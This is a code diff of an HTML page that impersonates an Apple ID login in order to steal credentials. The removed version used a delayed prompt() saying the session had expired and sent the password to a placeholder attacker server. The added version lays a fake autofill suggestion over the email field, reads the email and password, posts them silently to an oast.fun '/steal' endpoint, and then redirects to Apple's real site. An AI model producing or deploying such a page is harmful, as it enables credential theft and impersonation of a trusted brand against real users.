@@ -1,64 +1,81 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Session Verification</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apple ID Login</title>
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background: #f4f4f4;
-      height: 100%;
+    body {
       font-family: sans-serif;
       display: flex;
-      align-items: center;
-      justify-content: center;
       flex-direction: column;
+      align-items: center;
+      margin-top: 100px;
+    }
+
+    input {
+      padding: 12px;
+      width: 260px;
+      margin-bottom: 10px;
+      font-size: 16px;
     }
 
     button {
-      padding: 16px 32px;
-      font-size: 18px;
-      background: #007aff;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
+      padding: 12px 24px;
+      font-size: 16px;
     }
 
-    h2 {
-      margin-bottom: 20px;
+    /* 🕳️ Overlay suggestion fake */
+    .overlay-suggestion {
+      position: absolute;
+      top: 164px;
+      width: 264px;
+      height: 42px;
+      background: white;
+      border: 1px solid #ccc;
+      font-size: 15px;
+      line-height: 42px;
+      padding-left: 10px;
+      color: #222;
+      cursor: pointer;
+      z-index: 1000;
+    }
+
+    .container {
+      position: relative;
     }
   </style>
 </head>
 <body>
 
-<h2>Tap to Continue</h2>
-<button onclick="start()">Verify Identity</button>
+<h2>🔐 Apple ID Login</h2>
+
+<div class="container">
+  <input type="email" id="email" placeholder="Email / Apple ID" autocomplete="on" autofocus>
+  <!-- 👇 Overlay HTML element placed above browser autofill -->
+  <div class="overlay-suggestion" onclick="trapClick()">yourname@icloud.com</div>
+</div>
+
+<input type="password" id="password" placeholder="Password" autocomplete="on">
 
 <script>
-function start() {
-  // Delay prompt after gesture
+function trapClick() {
+  // Let autofill happen
   setTimeout(() => {
-    const input = prompt("🔐 Apple ID session expired.\nPlease enter your password to continue:");
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-    // After prompt, delay again then redirect to legit site
-    setTimeout(() => {
-      location.href = "https://appleid.apple.com"; // trusted domain
-    }, 800);
+    // Exfiltrate silently
+    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/steal", {
+      method: "POST",
+      body: JSON.stringify({ email, password }),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    });
 
-    // Optional: Send data (if testing exfil PoC)
-    if (input) {
-      fetch("https://your-attacker-server.com/log", {
-        method: "POST",
-        body: JSON.stringify({ password: input }),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      });
-    }
-
-  }, 3000); // Prompt shows after 3s delay (user loses gesture context)
+    alert("Thanks! Redirecting...");
+    // Simulate redirect to real site
+    location.href = "https://appleid.apple.com";
+  }, 300); // slight delay to let autofill trigger
 }
 </script>
 
